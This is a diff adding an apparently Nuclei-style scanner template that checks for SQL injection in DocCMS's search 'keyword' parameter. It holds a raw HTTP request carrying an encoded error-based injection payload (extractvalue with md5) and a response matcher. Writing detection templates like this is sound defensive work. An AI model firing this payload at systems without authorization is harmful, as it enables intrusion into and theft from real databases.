@@ -1,0 +1,27 @@
+id: DocCMS-keyword-sqli
+info:
+  name: DocCMS-keyword-sqli
+  author: apple
+  severity: high
+  description: DocCMS keyword参数存在 SQL注入漏洞，攻击者通过漏洞可以获取数据库信息.
+  reference:
+    - https://peiqi.h-k.pw/wiki/cms/DocCMS/DocCMS%20keyword%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
+    - https://blog.51cto.com/bypass/6631587
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET /search/index.php?keyword=1%2527%2520and%2520%2528extractvalue%25281%252Cconcat%25280x7e%252C%2528md5%2528%25271%2527%2529%2529%252C0x7e%2529%2529%2529%2523 HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "c4ca4238a0b923820dcc5"
